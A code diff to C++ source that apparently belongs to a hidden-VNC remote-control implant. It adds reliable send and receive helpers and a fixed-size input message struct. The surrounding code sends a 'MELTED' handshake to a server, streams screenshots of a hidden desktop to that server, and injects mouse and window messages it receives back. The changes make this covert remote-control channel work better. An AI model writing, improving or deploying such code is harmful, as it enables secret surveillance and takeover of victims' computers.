@@ -12,6 +12,13 @@ using namespace Gdiplus;
 enum Connection { desktop, input };
 enum Input { mouse };
 
+struct InputMessage
+{
+    DWORD msg;
+    DWORD wParam;
+    DWORD lParam;
+};
+
 static const BYTE     gc_magik[] = { 'M', 'E', 'L', 'T', 'E', 'D', 0 };
 static const COLORREF gc_trans = RGB(255, 174, 201);
 static const CLSID jpegID = { 0x557cf401, 0x1a04, 0x11d3,{ 0x9a,0x73,0x00,0x00,0xf8,0x1e,0xf3,0x2e } }; // id of jpeg format
@@ -241,9 +248,42 @@ static SOCKET ConnectServer()
     return s;
 }
 
-static int SendInt(SOCKET s, int i)
+static BOOL SendAll(SOCKET s, const void *buffer, int size)
 {
-    return Funcs::pSend(s, (char *)&i, sizeof(i), 0);
+    const char *data = (const char *)buffer;
+    int sent = 0;
+    while (sent != size)
+    {
+        int ret = Funcs::pSend(s, data + sent, size - sent, 0);
+        if (ret <= 0)
+            return FALSE;
+        sent += ret;
+    }
+    return TRUE;
+}
+
+static BOOL RecvAll(SOCKET s, void *buffer, int size)
+{
+    char *data = (char *)buffer;
+    int received = 0;
+    while (received != size)
+    {
+        int ret = Funcs::pRecv(s, data + received, size - received, 0);
+        if (ret <= 0)
+            return FALSE;
+        received += ret;
+    }
+    return TRUE;
+}
+
+static BOOL SendInt(SOCKET s, int i)
+{
+    return SendAll(s, &i, (int)sizeof(i));
+}
+
+static BOOL RecvInt(SOCKET s, int *i)
+{
+    return RecvAll(s, i, (int)sizeof(*i));
 }
 
 static DWORD WINAPI DesktopThread(LPVOID param)
@@ -253,29 +293,29 @@ static DWORD WINAPI DesktopThread(LPVOID param)
     if (!Funcs::pSetThreadDesktop(g_hDesk))
         goto exit;
 
-    if (Funcs::pSend(s, (char *)gc_magik, sizeof(gc_magik), 0) <= 0)
+    if (!SendAll(s, gc_magik, (int)sizeof(gc_magik)))
         goto exit;
-    if (SendInt(s, Connection::desktop) <= 0)
+    if (!SendInt(s, Connection::desktop))
         goto exit;
 
     for (;;)
     {
         int width, height;
 
-        if (Funcs::pRecv(s, (char *)&width, sizeof(width), 0) <= 0)
+        if (!RecvInt(s, &width))
             goto exit;
-        if (Funcs::pRecv(s, (char *)&height, sizeof(height), 0) <= 0)
+        if (!RecvInt(s, &height))
             goto exit;
 
         BOOL same = GetDeskPixels(width, height);
         if (same)
         {
-            if (SendInt(s, 0) <= 0)
+            if (!SendInt(s, 0))
                 goto exit;
             continue;
         }
 
-        if (SendInt(s, 1) <= 0)
+        if (!SendInt(s, 1))
             goto exit;
 
         DWORD workSpaceSize;
@@ -298,21 +338,21 @@ static DWORD WINAPI DesktopThread(LPVOID param)
         RECT rect;
         HWND hWndDesktop = Funcs::pGetDesktopWindow();
         Funcs::pGetWindowRect(hWndDesktop, &rect);
-        if (SendInt(s, rect.right) <= 0)
+        if (!SendInt(s, rect.right))
             goto exit;
-        if (SendInt(s, rect.bottom) <= 0)
+        if (!SendInt(s, rect.bottom))
             goto exit;
-        if (SendInt(s, g_bmpInfo.bmiHeader.biWidth) <= 0)
+        if (!SendInt(s, g_bmpInfo.bmiHeader.biWidth))
             goto exit;
-        if (SendInt(s, g_bmpInfo.bmiHeader.biHeight) <= 0)
+        if (!SendInt(s, g_bmpInfo.bmiHeader.biHeight))
             goto exit;
-        if (SendInt(s, size) <= 0)
+        if (!SendInt(s, (int)size))
             goto exit;
-        if (Funcs::pSend(s, (char *)g_tempPixels, size, 0) <= 0)
+        if (!SendAll(s, g_tempPixels, (int)size))
             goto exit;
 
-        DWORD response;
-        if (Funcs::pRecv(s, (char *)&response, sizeof(response), 0) <= 0)
+        int response;
+        if (!RecvInt(s, &response))
             goto exit;
     }
 
@@ -515,13 +555,13 @@ static DWORD WINAPI InputThread(LPVOID param)
 
     Funcs::pSetThreadDesktop(g_hDesk);
 
-    if (Funcs::pSend(s, (char *)gc_magik, sizeof(gc_magik), 0) <= 0)
+    if (!SendAll(s, gc_magik, (int)sizeof(gc_magik)))
         return 0;
-    if (SendInt(s, Connection::input) <= 0)
+    if (!SendInt(s, Connection::input))
         return 0;
 
-    DWORD response;
-    if (!Funcs::pRecv(s, (char *)&response, sizeof(response), 0))
+    int response;
+    if (!RecvInt(s, &response))
         return 0;
 
     g_hDesktopThread = Funcs::pCreateThread(NULL, 0, DesktopThread, NULL, 0, 0);
@@ -536,16 +576,13 @@ static DWORD WINAPI InputThread(LPVOID param)
 
     for (;;)
     {
-        UINT   msg;
-        WPARAM wParam;
-        LPARAM lParam;
+        InputMessage input;
+        if (!RecvAll(s, &input, (int)sizeof(input)))
+            goto exit;
 
-        if (Funcs::pRecv(s, (char *)&msg, sizeof(msg), 0) <= 0)
-            goto exit;
-        if (Funcs::pRecv(s, (char *)&wParam, sizeof(wParam), 0) <= 0)
-            goto exit;
-        if (Funcs::pRecv(s, (char *)&lParam, sizeof(lParam), 0) <= 0)
-            goto exit;
+        UINT   msg = (UINT)input.msg;
+        WPARAM wParam = (WPARAM)input.wParam;
+        LPARAM lParam = (LPARAM)input.lParam;
 
         HWND  hWnd{};
         POINT point;
